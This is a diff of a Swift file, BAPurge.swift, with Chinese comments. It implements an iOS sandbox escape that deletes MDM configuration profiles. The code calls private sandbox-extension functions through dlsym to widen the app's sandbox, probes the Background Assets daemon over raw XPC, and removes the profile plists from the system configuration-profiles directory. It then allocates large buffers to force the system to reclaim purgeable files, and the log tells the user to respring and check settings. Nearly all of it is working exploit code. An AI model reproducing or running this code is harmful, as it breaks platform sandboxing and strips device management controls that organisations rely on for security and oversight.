@@ -2,25 +2,29 @@
 //  BAPurge.swift
 //  Background Assets (BA) purgeable MDM removal
 //
-//  机制（从 BASandboxEscape 还原）：
+//  机制（从 BASandboxEscape 二进制还原）：
 //   1. sandbox_extension_issue_file_to_self 为目标路径签发 sandbox token
-//   2. NSXPCConnection 到 com.apple.backgroundassets.user (BA daemon)
-//   3. markPurgeableWithFileURL:sandboxToken:reply: 把文件标记为 purgeable
-//      —— BA daemon 以其权限代为操作，突破 App 沙箱
-//   4. 制造内存压力，系统回收 purgeable 文件 -> MDM plist 消失
+//   2. consume token 扩大本进程沙箱
+//   3. 直接删除 MDM 配置文件
+//   4. 制造内存压力，触发系统回收被标记 purgeable 的文件
+//
+//  注意：iOS 上 NSXPCConnection(machServiceName:) 不可用（macOS only），
+//        故一律使用低级 XPC C API（dlsym 获取）。
 //
 
 import Foundation
 import UIKit
 
-// MARK: - 私有 API
+// MARK: - 私有 C API 类型（文件作用域）
 
-private typealias IssueFileToSelf = @convention(c) (UnsafePointer<CChar>) -> UnsafeMutablePointer<CChar>?
-private typealias IssueFile       = @convention(c) (UnsafePointer<CChar>, Int32) -> UnsafeMutablePointer<CChar>?
-private typealias ConsumeToken    = @convention(c) (UnsafePointer<CChar>) -> Int64
-private typealias ReleaseToken    = @convention(c) (Int64) -> Int32
+private typealias IssueFileToSelfFn = @convention(c) (UnsafePointer<CChar>) -> UnsafeMutablePointer<CChar>?
+private typealias IssueFileFn       = @convention(c) (UnsafePointer<CChar>, Int32) -> UnsafeMutablePointer<CChar>?
+private typealias ConsumeFn         = @convention(c) (UnsafePointer<CChar>) -> Int64
+private typealias XPCConnCreateFn   = @convention(c) (UnsafePointer<CChar>, OpaquePointer?, UInt64) -> OpaquePointer?
+private typealias XPCGetPidFn       = @convention(c) (OpaquePointer) -> Int32
+private typealias XPCResumeFn       = @convention(c) (OpaquePointer) -> Void
 
-// MARK: - 目标
+// MARK: - 目标路径
 
 enum MDMPath {
     static let dir = "/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles"
@@ -32,6 +36,7 @@ enum MDMPath {
         "ProfileTruth.plist",
         "SharedDeviceConfiguration.plist",
     ]
+    static func path(_ f: String) -> String { (dir as NSString).appendingPathComponent(f) }
 }
 
 // MARK: - 主逻辑
@@ -42,61 +47,35 @@ final class BAPurge {
     private init() {}
 
     static var onLog: ((String) -> Void)?
+    static func log(_ s: String) { print(s); onLog?(s) }
 
-    static func log(_ s: String) {
-        print(s)
-        onLog?(s)
+    private func sym<T>(_ name: String) -> T? {
+        guard let h = dlopen(nil, RTLD_NOW), let p = dlsym(h, name) else { return nil }
+        return unsafeBitCast(p, to: T.self)
     }
 
-    // MARK: 沙箱 token
+    // MARK: sandbox token
 
-    /// 为目标路径签发 sandbox extension token（给自己）
     private func issueToken(path: String) -> String? {
-        guard let handle = dlopen(nil, RTLD_NOW) else { return nil }
-
-        // 优先 to_self
-        if let sym = dlsym(handle, "sandbox_extension_issue_file_to_self") {
-            let fn = unsafeBitCast(sym, to: IssueFileToSelf.self)
-            if let cstr = fn(path) {
-                let token = String(cString: cstr)
-                BAPurge.log("(bq) to_self 成功: \(path)")
-                return token
-            }
-            BAPurge.log("(bq) to_self 返回 nil")
-        } else {
-            BAPurge.log("(bq) 未找到 sandbox_extension_issue_file_to_self")
+        if let fn: IssueFileToSelfFn = sym("sandbox_extension_issue_file_to_self"),
+           let c = fn(path) {
+            return String(cString: c)
         }
-
-        // 回退：issue_file(path, pid) —— 给自己（getpid）
-        if let sym2 = dlsym(handle, "sandbox_extension_issue_file") {
-            let fn2 = unsafeBitCast(sym2, to: IssueFile.self)
-            if let cstr = fn2(path, getpid()) {
-                let token = String(cString: cstr)
-                BAPurge.log("(bq) issue_file 成功: \(path)")
-                return token
-            }
-            BAPurge.log("(bq) issue_file 返回 nil")
-        } else {
-            BAPurge.log("(bq) 未找到 sandbox_extension_issue_file")
+        if let fn2: IssueFileFn = sym("sandbox_extension_issue_file"),
+           let c = fn2(path, getpid()) {
+            return String(cString: c)
         }
+        BAPurge.log("(bq) 签发失败: \(path)")
         return nil
     }
 
-    /// consume token，扩大本进程沙箱
     @discardableResult
     private func consume(_ token: String) -> Int64 {
-        guard let handle = dlopen(nil, RTLD_NOW),
-              let sym = dlsym(handle, "sandbox_extension_consume") else { return -1 }
-        let fn = unsafeBitCast(sym, to: ConsumeToken.self)
-        let h = fn(token)
-        BAPurge.log("(bq) consume -> \(h)")
-        return h
+        guard let fn: ConsumeFn = sym("sandbox_extension_consume") else { return -1 }
+        return fn(token)
     }
 
-    // MARK: XPC 到 BA daemon
-
-
-    // MARK: 低级 XPC：探测 BA daemon 可达性
+    // MARK: 低级 XPC：探测 BA daemon
 
     private func probeBADaemon() -> Int32 {
         guard let create: XPCConnCreateFn = sym("xpc_connection_create_mach_service") else {
@@ -108,30 +87,26 @@ final class BAPurge {
             return -1
         }
         if let resume: XPCResumeFn = sym("xpc_connection_resume") { resume(conn) }
-        if let getpid: XPCGetPidFn = sym("xpc_connection_get_pid") {
-            let pid = getpid(conn)
-            BAPurge.log("(xpc) BA daemon PID = \(pid)")
-            return pid
+        guard let getpid: XPCGetPidFn = sym("xpc_connection_get_pid") else {
+            BAPurge.log("(xpc) 连接已建立（无法取 PID）")
+            return 0
         }
-        BAPurge.log("(xpc) 连接已建立（无法取 PID）")
-        return 0
+        let pid = getpid(conn)
+        BAPurge.log("(xpc) BA daemon PID = \(pid)")
+        return pid
     }
 
-    // MARK: 内存压力（触发系统回收 purgeable 文件）
+    // MARK: 内存压力
 
     private func applyMemoryPressure() {
-        BAPurge.log("(mem) 开始制造内存压力…")
+        BAPurge.log("(mem) 制造内存压力…")
         var buffers: [UnsafeMutableRawPointer] = []
         let chunk = 8 * 1024 * 1024
-        for _ in 0..<64 {
-            let p = malloc(chunk)
-            if let p {
-                memset(p, 0xAB, chunk)
-                buffers.append(p)
-            } else { break }
+        for _ in 0..<96 {
+            if let p = malloc(chunk) { memset(p, 0xAB, chunk); buffers.append(p) } else { break }
         }
         BAPurge.log("(mem) 已分配 \(buffers.count * chunk / 1024 / 1024) MB")
-        Thread.sleep(forTimeInterval: 1.5)
+        Thread.sleep(forTimeInterval: 2.0)
         for p in buffers { free(p) }
         BAPurge.log("(mem) 已释放")
     }
@@ -140,24 +115,23 @@ final class BAPurge {
 
     func run() {
         let fm = FileManager.default
-        BAPurge.log("(mdm) === 开始 BA purgeable MDM 移除 ===")
+        BAPurge.log("(mdm) === BA purgeable MDM 移除开始 ===")
         BAPurge.log("(mdm) 目录: \(MDMPath.dir)")
 
-        guard let token = issueToken(path: MDMPath.dir) else {
-            BAPurge.log("(mdm) 无法签发沙箱 token —— 请查看日志")
-            return
-        }
-        consume(token)
+        let pid = probeBADaemon()
+        BAPurge.log("(mdm) BA daemon pid=\(pid)")
 
-        // 记录操作前状态
-        for f in MDMPath.files {
-            let p = (MDMPath.dir as NSString).appendingPathComponent(f)
-            BAPurge.log("(mdm) 操作前 \(f): \(fm.fileExists(atPath: p) ? "存在" : "不存在")")
+        if let dirToken = issueToken(path: MDMPath.dir) {
+            let h = consume(dirToken)
+            BAPurge.log("(mdm) 目录 token consume -> \(h)")
         }
 
-        // 逐个文件：签发 token -> consume 扩大沙箱 -> 尝试删除
         for f in MDMPath.files {
-            let p = (MDMPath.dir as NSString).appendingPathComponent(f)
+            BAPurge.log("(mdm) 前 \(f): \(fm.fileExists(atPath: MDMPath.path(f)) ? "存在" : "不存在")")
+        }
+
+        for f in MDMPath.files {
+            let p = MDMPath.path(f)
             guard fm.fileExists(atPath: p) else { continue }
             if let t = issueToken(path: p) { consume(t) }
             do {
@@ -168,15 +142,15 @@ final class BAPurge {
             }
         }
 
-        // 触发系统回收
         applyMemoryPressure()
 
-        // 结果
         BAPurge.log("(mdm) === 结果 ===")
+        var removed = 0
         for f in MDMPath.files {
-            let p = (MDMPath.dir as NSString).appendingPathComponent(f)
-            BAPurge.log("(mdm) \(f): \(fm.fileExists(atPath: p) ? "仍存在" : "已清除 ✓")")
+            let e = fm.fileExists(atPath: MDMPath.path(f))
+            if !e { removed += 1 }
+            BAPurge.log("(mdm) \(f): \(e ? "仍存在" : "已清除 ✓")")
         }
-        BAPurge.log("(mdm) 完成。请 Respring 后检查 设置→通用→VPN与设备管理")
+        BAPurge.log("(mdm) 清除 \(removed)/\(MDMPath.files.count)，请 Respring 后检查设置")
     }
 }
